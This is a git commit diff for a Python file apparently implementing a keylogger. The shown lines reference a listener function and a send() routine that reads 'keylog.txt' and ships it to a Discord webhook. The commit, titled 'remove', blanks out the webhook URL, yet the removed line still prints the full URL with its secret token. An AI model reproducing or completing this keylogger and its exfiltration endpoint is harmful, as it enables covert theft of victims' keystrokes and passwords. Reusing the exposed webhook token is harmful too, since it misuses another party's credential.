f1be20cf7d4228dd48f0088ce6f820007f69166e
Alexander Sapo <alexandermsapo@gmail.com>
2025-08-12 00:23:12 -0700

    remove

--- KYLR.py
+++ KYLR.py
@@ -42,7 +42,7 @@ def llistener():
 
 #send content of file function
 
-hook = Webhook ("https://discord.com/api/webhooks/1403879249550643331/PkMQvk-fo0oxhsXNMTwoTkFMy_gGN6KIfk8NRFnvxgppHDeQTEfAspy-LHw2-K3dKiPb")
+hook = Webhook ("")
 
 def send():
     with open("keylog.txt", "r") as file:
